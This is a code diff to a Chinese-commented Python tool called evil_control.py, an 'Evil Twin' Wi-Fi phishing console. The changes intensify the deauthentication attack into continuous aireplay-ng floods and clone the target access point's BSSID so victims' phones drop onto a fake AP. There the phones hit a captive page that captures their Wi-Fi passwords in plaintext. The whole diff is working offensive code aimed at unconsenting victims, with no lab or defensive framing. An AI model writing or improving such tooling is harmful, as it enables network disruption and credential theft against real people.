@@ -15,7 +15,7 @@ Web 界面 (默认端口 8090):
   - dnsmasq            : DHCP + DNS 劫持
 
 以 root 运行:  sudo python3 evil_control.py
-配置方式:通过环境变量覆盖默认值（见 config.env.example）
+配置方式: 通过环境变量覆盖默认值（见 config.env.example）
 """
 import os
 import re
@@ -55,7 +55,7 @@ for _entry in os.environ.get("EVIL_HASHES", "").split(";"):
 
 # ---------------- 状态 ----------------
 state = {
-    "mode":    "idle",        # idle | attacking | stopping | error
+    "mode":    "idle",        # idle | attacking | error
     "target":  None,          # {"ssid","bssid","channel","enc"}
     "last_target": None,      # 目标快照（停止后保留，供历史记录）
     "started": None,
@@ -154,22 +154,22 @@ def stop_services():
     time.sleep(1)
 
 def deauth_loop(target, iface):
-    """攻击期间持续踢人：周期广播 deauth 让真 AP 客户端掉线，
-    直到验证通过自动关闭假 AP 或手动停止（stop_event 置位）。
+    """攻击期间持续踢人：高频压制真 AP（~15 秒一轮，每轮连续轰炸 5 秒），
+    让真 AP 永远没有稳定服务窗口 → 手机连不上真 AP，只能落回假 AP。
 
     关键逻辑：以"最近是否有密码提交"判断是否有人在交互——
       - 60 秒内有密码提交 → 跳过本轮（不打断正在输密码的受害者）
-      - 无提交 → 执行踢人轮：闪断假 AP + 踢真 AP 客户端，
-        强制受害者手机重新关联 → 重新触发系统认证弹窗
+      - 无提交 → 执行压制轮：闪断假 AP + 连续 deauth 轰炸真 AP 5 秒，
+        再恢复假 AP（重新克隆 BSSID），强制受害者手机落回假 AP 触发认证页
     """
     bssid, channel = target["bssid"], target["channel"]
-    log("持续踢人循环启动（每 30 秒一轮；60 秒无密码提交则闪断假 AP 强制重连）")
+    log("持续踢人循环启动（高频压制 ~15 秒一轮，每轮轰炸 5 秒；交互中自动暂停）")
     while not deauth_stop.is_set():
         # 有人正在交互（最近 60 秒提交过密码）→ 跳过本轮，避免打断
         if time.time() - last_post_ts() < 60:
             deauth_stop.wait(10)
             continue
-        # 短暂切 monitor 广播 deauth，再恢复假 AP（闪断 → 受害者重连 → 重新触发认证页）
+        # 1. 停假 AP → 切 monitor（压制阶段，真 AP 无稳定窗口）
         run(f"systemctl stop {UNITS['hostapd']} 2>/dev/null; systemctl reset-failed {UNITS['hostapd']} 2>/dev/null")
         run("pkill -9 -f hostapd-mana 2>/dev/null")
         time.sleep(1)
@@ -177,10 +177,12 @@ def deauth_loop(target, iface):
         time.sleep(1)
         run(f"iw dev {iface} set channel {channel} 2>/dev/null")
         time.sleep(1)
-        run(f"timeout 5 aireplay-ng -0 4 -a {bssid} {iface}", timeout=12)
-        # 恢复假 AP 模式（hostapd 重新接管）
+        # 2. 连续轰炸 5 秒（-0 0 无限循环 + timeout 5，真 AP 全程被打）
+        run(f"timeout 5 aireplay-ng -0 0 -a {bssid} {iface}", timeout=12)
+        # 3. 恢复假 AP（managed + 重新克隆 BSSID + 起 hostapd）
         run(f"ip link set {iface} down; iw dev {iface} set type managed")
         run(f"ip addr flush dev {iface} 2>/dev/null")
+        run(f"ip link set {iface} address {bssid} 2>/dev/null")
         run(f"ip addr add {GATEWAY_IP}/24 dev {iface}")
         run(f"ip link set {iface} up")
         time.sleep(1)
@@ -193,8 +195,8 @@ def deauth_loop(target, iface):
             out, _, _ = run(f"systemctl is-active {UNITS['hostapd']}")
             if "active" in out:
                 break
-        # 等待下一轮（30 秒一轮）
-        deauth_stop.wait(30)
+        # 4. 假 AP 在线窗口（短暂），随后立即进入下一轮压制
+        deauth_stop.wait(6)
 
 def start_attack(target):
     global deauth_stop, deauth_thread
@@ -211,6 +213,14 @@ def start_attack(target):
         state["verify"] = None
     ssid, bssid, channel = target["ssid"], target["bssid"], target["channel"]
     log(f"目标: {ssid} ({bssid}) ch{channel}")
+
+    # 0. 记录网卡原始 MAC（攻击结束时恢复；克隆 BSSID 需要）
+    out, _, _ = run(f"ip link show {IFACE}")
+    _m = re.search(r"ether ([0-9a-fA-F:]{17})", out)
+    if _m:
+        with open(os.path.join(BASE_DIR, "orig_mac"), "w") as _f:
+            _f.write(_m.group(1).lower())
+        log(f"记录网卡原始 MAC: {_m.group(1).lower()}")
 
     # 1. 停掉可能残留的服务与干扰
     stop_services()
@@ -231,8 +241,12 @@ def start_attack(target):
     run(f"ip link set {IFACE} down; iw dev {IFACE} set type managed")
     run(f"ip addr flush dev {IFACE} 2>/dev/null")
     run(f"ip addr add {GATEWAY_IP}/24 dev {IFACE}")
+    # 3b. 克隆目标 BSSID 到网卡：假 AP 与真 AP 同 MAC，手机视为"同一个网络"，
+    #     不再因加密类型不同而抢连真 AP（同 SSID 同 MAC，认证配置不符 → 自动弹认证页）
+    run(f"ip link set {IFACE} address {bssid} 2>/dev/null")
     run(f"ip link set {IFACE} up")
     time.sleep(1)
+    log(f"假 AP 已克隆 BSSID {bssid}（与真 AP 同 MAC）")
 
     # 4. 写配置
     hostapd_cfg = (
@@ -256,7 +270,7 @@ def start_attack(target):
     with open(DNSMASQ_CONF, "w") as f:
         f.write(dnsmasq_cfg)
 
-    # 5. 释放 53 端口 (systemd-resolved)
+    # 5. 释放 53 端口 (systemd-resolved 占用)
     run("systemctl stop systemd-resolved 2>/dev/null")
     time.sleep(1)
 
@@ -317,6 +331,17 @@ def stop_attack():
     ensure_managed()
     # 清理残留的钓鱼网段地址
     run(f"ip addr flush dev {IFACE} 2>/dev/null")
+    # 恢复网卡原始 MAC（克隆 BSSID 复原）
+    try:
+        _om = os.path.join(BASE_DIR, "orig_mac")
+        if os.path.exists(_om):
+            with open(_om) as _f:
+                _omac = _f.read().strip()
+            if _omac:
+                run(f"ip link set {IFACE} down; ip link set {IFACE} address {_omac}; ip link set {IFACE} up")
+                log(f"已恢复网卡原始 MAC: {_omac}")
+    except Exception as _e:
+        log(f"恢复 MAC 失败（不影响使用）: {_e}")
     with lock:
         state["mode"] = "idle"
         state["target"] = None
@@ -451,7 +476,7 @@ tr:hover td{background:#1e293b}
 <div class="wrap">
 <h1>&#x1F50D; Evil Twin 自动化钓鱼控制台</h1>
 <div class="sub">选择目标 WiFi → 一键攻击 → 受害者输密码 → 明文直接显示
-<br>访问方式：钓鱼通道 <b>http://10.0.0.1:8090</b>（受害者连假 AP 后）· 局域网 <b>http://&lt;本机IP&gt;:8090</b></div>
+<br>访问方式：局域网 <b>http://&lt;本机IP&gt;:8090</b> · 钓鱼通道 <b>http://10.0.0.1:8090</b>（受害者连假 AP 后）</div>
 
 <div class="card">
   <div class="status-line">
@@ -578,7 +603,6 @@ async function doAttack() {
     setDot('error', '请求失败: ' + e.message);
     $('attackBtn').disabled = false; $('attackBtn').textContent = '&#x26A1; 开始攻击';
   }
-  // 按钮状态由 poll() 统一管理
 }
 
 async function doStop() {
@@ -640,7 +664,7 @@ async function poll() {
     }
     // log
     if (d.log && d.log.length) {
-      $('logBox').textContent = d.log.slice(-40).join('\\n');
+      $('logBox').textContent = d.log.slice(-40).join('\n');
       $('logBox').scrollTop = $('logBox').scrollHeight;
     }
     // mode sync: 攻击中锁定按钮，idle 恢复
